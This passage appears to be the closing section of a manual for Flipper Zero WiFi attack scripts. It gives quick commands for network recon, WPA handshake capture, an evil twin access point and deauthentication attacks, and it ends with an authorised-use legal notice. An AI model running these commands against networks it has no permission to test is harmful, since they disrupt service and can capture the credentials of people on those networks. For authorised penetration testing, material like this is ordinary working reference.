./01-recon-pipeline.sh wlan0 30

# Capture Handshake
./02-handshake-capture.sh <BSSID> <CH> '<ESSID>'

# Evil Twin
./03-evil-twin.sh <BSSID> <CH> '<ESSID>' wlan0 wlan1 true

# Deauth Single
./04-deauth-campaign.sh single <BSSID>

# Monitor
./05-network-monitor.sh wlan0 15

# View Results
cat /root/recon/*.csv
cat /root/captures/*.log

# Download
scp root@192.168.178.122:/root/captures/*.cap ./
```

### Flipper Quick Commands

```
# List Scripts
bh script scan

# Recon
bh script run wifi_recon

# Set Target (via SSH first)
# Create /root/target.conf

# Capture
bh script run capture_handshake

# Evil Twin
bh script run evil_twin

# Deauth
bh script run deauth_target

# Monitor
bh script run network_monitor

# Check Target
bh script run set_target
```

---

## Legal Notice

**⚠️ WARNING: Authorized Use Only**

These tools are provided for:
- Authorized penetration testing
- Security research
- Educational purposes
- Network administration (your own networks)

**Requirements:**
- Written authorization from network owners
- Compliance with local laws (Computer Fraud and Abuse Act, CFAA)
- Ethical use principles

**Prohibited:**
- Unauthorized access to networks
- Disrupting services without permission
- Credential theft or data exfiltration
- Any illegal activity

**Users are solely responsible for ensuring legal compliance.**

---

**Manual Version:** 1.0
**Last Updated:** 2025-10-28
**Compatible With:** BlackHat OS on Flipper Zero WiFi Dev Board
**Authors:** Generated for authorized security testing

---

**End of Manual**
